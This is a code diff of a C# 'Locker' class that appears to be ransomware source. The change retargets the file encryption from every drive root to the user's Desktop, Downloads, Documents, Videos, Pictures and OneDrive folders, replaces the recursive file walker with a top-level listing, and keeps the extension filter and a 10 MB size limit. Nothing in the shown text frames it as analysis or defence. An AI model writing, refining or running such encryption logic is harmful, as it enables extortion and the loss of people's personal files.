@@ -44,13 +44,23 @@ internal static class Locker
     private const string EncryptionFileExtension = Config.EncryptionFileExtension;
     private const string EncryptionPassword = Config.EncryptionPassword;
 
+    private static HashSet<string> DirectoriesToEncrypt = new HashSet<string>()
+    {
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop"),
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents"),
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Videos"),
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Pictures"),
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive")
+    };
+    
     internal static void EncryptFileSystem()
     {
         var extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
 
-        foreach (var drivePath in DriveInfo.GetDrives().Select(drive => drive.RootDirectory.FullName))
+        foreach (var directory in DirectoriesToEncrypt)
         {
-            EncryptFiles(drivePath, EncryptionFileExtension, extensionsToEncrypt);
+            EncryptFiles(directory, EncryptionFileExtension, extensionsToEncrypt);
         }
 
         foreach (var file in EncryptedFiles)
@@ -82,43 +92,10 @@ internal static class Locker
         return extensionsToEncrypt;
     }
 
-    private static IEnumerable<string> GetFiles(string path)
-    {
-        var queue = new Queue<string>();
-        queue.Enqueue(path);
-        while (queue.Count > 0)
-        {
-            path = queue.Dequeue();
-            try
-            {
-                foreach (var subDir in Directory.GetDirectories(path))
-                {
-                    queue.Enqueue(subDir);
-                }
-            }
-            catch (Exception ex)
-            {
-            }
-            string[] files = null;
-            try
-            {
-                files = Directory.GetFiles(path);
-            }
-            catch (Exception ex)
-            {
-            }
-            if (files == null) continue;
-            foreach (var t in files)
-            {
-                yield return t;
-            }
-        }
-    }
-
     private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
     {
         foreach (var file in
-            (from file in GetFiles(dirPath) from ext in extensionsToEncrypt where file.EndsWith(ext) select file)
+            (from file in Directory.GetFiles(dirPath) from ext in extensionsToEncrypt where file.EndsWith(ext) select file)
                 .Select(file => new { file, fi = new FileInfo(file) })
                 .Where(@t => @t.fi.Length < 10000000)
                 .Select(@t => @t.file))
